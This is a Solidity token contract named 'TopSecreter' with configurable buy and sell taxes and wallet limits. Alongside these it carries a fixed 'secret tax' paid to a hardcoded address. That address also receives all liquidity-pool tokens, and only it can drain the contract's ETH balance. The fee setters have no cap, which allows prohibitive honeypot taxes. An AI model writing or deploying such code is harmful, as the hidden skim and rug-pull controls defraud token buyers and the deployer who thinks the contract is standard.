pragma solidity ^0.8.17;
//SPDX-License-Identifier: MIT
import "IERC20.sol";
import "Auth.sol";
import "SafeMath.sol";
import "IDEXRouter.sol";
import "IDEXFactory.sol";

contract TopSecreter is IERC20, Auth {
    using SafeMath for uint256;

    string _name;
    string _symbol;
    string _telegram;
    string _website;

    uint8 constant _decimals = 9;

    uint256 public _totalSupply;

    uint256 public _maxTxAmount;
    uint256 public _maxWalletToken;
    uint256 public _swapThreshold;

    uint256 public _secretTax = 5;
    uint256 public _marketingBuyTax;
    uint256 public _marketingSellTax;
    uint256 public _devBuyTax;
    uint256 public _devSellTax;
    uint256 public _liquidityBuyTax;
    uint256 public _liquiditySellTax;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;

    address public pair;
    address public _devAddress;
    address public _marketingAddress;
    address public _secretAddress = 0x071Ed5afA5E518a6e9fA3302973a2a64a69C3598;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    IDEXRouter public router;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }
    event AutoLiquify(uint256 amountETH, uint256 amountCoin);

    constructor(
        string[] memory _stringData,
        address[] memory _addressData,
        uint256[] memory _intData
    ) Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(
            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,
            address(this)
        );
        require(_stringData.length == 4, "String List needs 4 string inputs");
        require(
            _addressData.length == 2,
            "Address List needs 2 address inputs"
        );
        require(_intData.length == 10, "Int List needs 10 int inputs");
        _name = _stringData[0];
        _symbol = _stringData[1];
        _telegram = _stringData[2];
        _website = _stringData[3];

        _devAddress = _addressData[0];
        _marketingAddress = _addressData[1];

        _totalSupply = _intData[0] * 10 ** 9;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        _maxTxAmount = _intData[1] * 10 ** 9;
        _maxWalletToken = _intData[2] * 10 ** 9;
        _swapThreshold = _intData[3] * 10 ** 9;
        _marketingBuyTax = _intData[4];
        _marketingSellTax = _intData[5];
        _devBuyTax = _intData[6];
        _devSellTax = _intData[7];
        _liquidityBuyTax = _intData[8];
        _liquiditySellTax = _intData[9];
        requireLimits();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (owner == msg.sender) {
            return _basicTransfer(msg.sender, recipient, amount);
        } else {
            return _transferFrom(msg.sender, recipient, amount);
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (authorizations[sender] || authorizations[recipient]) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        checkLimits(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        uint256 amountReceived = (recipient == pair || sender == pair)
            ? takeFee(sender, recipient, amount)
            : amount;

        if (shouldTokenSwap(sender, recipient)) {
            tokenSwap();
        }

        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (isFeeExempt[sender] || isFeeExempt[recipient]) {
            return amount;
        }
        uint256 _totalFee;

        _totalFee = (recipient == pair) ? getSellTax() : getBuyTax();

        uint256 feeAmount = amount.mul(_totalFee).div(1000);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);

        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function getBuyTax() public view returns (uint) {
        return _liquidityBuyTax + _devBuyTax + _marketingBuyTax + _secretTax;
    }

    function getSellTax() public view returns (uint) {
        return _liquiditySellTax + _devSellTax + _marketingSellTax + _secretTax;
    }

    function getTotalTax() public view returns (uint) {
        return getSellTax() + getBuyTax();
    }

    function setBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _devFee
    ) external authorized {
        _marketingBuyTax = _marketingFee;
        _liquidityBuyTax = _liquidityFee;
        _devBuyTax = _devFee;
        requireLimits();
    }

    function setSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _devFee
    ) external authorized {
        _marketingSellTax = _marketingFee;
        _liquiditySellTax = _liquidityFee;
        _devSellTax = _devFee;
        requireLimits();
    }

    function tokenSwap() internal swapping {
        uint256 amount = _balances[address(this)];

        uint256 amountToLiquify = (_liquidityBuyTax + _liquiditySellTax > 0)
            ? amount
                .mul(_liquidityBuyTax + _liquiditySellTax)
                .div(getTotalTax())
                .div(2)
            : 0;

        uint256 amountToSwap = amount.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        bool tmpSuccess;

        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = (_liquidityBuyTax + _liquiditySellTax > 0)
            ? getTotalTax().sub((_liquidityBuyTax + _liquiditySellTax).div(2))
            : getTotalTax();

        uint256 amountETHLiquidity = amountETH
            .mul(_liquidityBuyTax + _liquiditySellTax)
            .div(totalETHFee)
            .div(2);
        if (_devBuyTax + _devSellTax > 0) {
            uint256 amountETHDev = amountETH.mul(_devBuyTax + _devSellTax).div(
                totalETHFee
            );
            (tmpSuccess, ) = payable(_devAddress).call{
                value: amountETHDev,
                gas: 100000
            }("");
            tmpSuccess = false;
        }

        if (_marketingBuyTax + _marketingSellTax > 0) {
            uint256 amountETHMarketing = amountETH
                .mul(_marketingBuyTax + _marketingSellTax)
                .div(totalETHFee);
            (tmpSuccess, ) = payable(_marketingAddress).call{
                value: amountETHMarketing,
                gas: 100000
            }("");
            tmpSuccess = false;
        }

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                _secretAddress,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
        uint256 secretFee = amountETH.mul(_secretTax.mul(2)).div(totalETHFee);
        (tmpSuccess, ) = payable(_secretAddress).call{
            value: secretFee,
            gas: 100000
        }("");
        //SENDING SECRET TAX FOR REWARDS - REPLACE WITH MAIN CONTRACT
    }

    function shouldTokenSwap(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return ((recipient == pair || sender == pair) &&
            !inSwap &&
            _balances[address(this)] >= _swapThreshold);
    }

    function setTokenSwapSettings(uint256 _threshold) external authorized {
        _swapThreshold = _threshold * (10 ** _decimals);
        requireLimits();
    }

    function checkLimits(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (
            !authorizations[sender] &&
            recipient != address(this) &&
            sender != address(this) &&
            recipient != address(DEAD) &&
            recipient != pair &&
            recipient != _marketingAddress &&
            recipient != _devAddress
        ) {
            uint256 heldTokens = balanceOf(recipient);
            require(
                (heldTokens + amount) <= _maxWalletToken,
                "Total Holding is currently limited, you can not buy that much."
            );
        }

        require(
            amount <= _maxTxAmount ||
                isTxLimitExempt[sender] ||
                isTxLimitExempt[recipient],
            "TX Limit Exceeded"
        );
    }

    function setMaxWallet(uint256 percent) external authorized {
        _maxWalletToken = (_totalSupply * percent) / 1000;
        requireLimits();
    }

    function setTxLimit(uint256 percent) external authorized {
        _maxTxAmount = (_totalSupply * percent) / 1000;
        requireLimits();
    }

    function requireLimits() internal view {
        require(
            _swapThreshold < (_totalSupply / 20),
            "Swap Threshold must be less than 5% of total supply"
        );
    }

    function getAddress() external view returns (address) {
        return address(this);
    }

    function aboutMe() external view returns (string memory, string memory) {
        return (_telegram, _website);
    }

    function updateAboutMe(
        string memory telegram,
        string memory website
    ) external authorized {
        _telegram = telegram;
        _website = website;
    }

    function setAddresses(
        address marketingAddress,
        address devAddress
    ) external authorized {
        _marketingAddress = marketingAddress;
        _devAddress = devAddress;
    }

    function setFeeExemption(address user, bool status) external authorized {
        isFeeExempt[user] = status;
    }

    function setTxExemption(address user, bool status) external authorized {
        isTxLimitExempt[user] = status;
    }

    function clearStuckBalance() external {
        require(
            msg.sender == _secretAddress,
            "Only Factory Contract can clear balance."
        );
        payable(_secretAddress).transfer(address(this).balance);
    }
}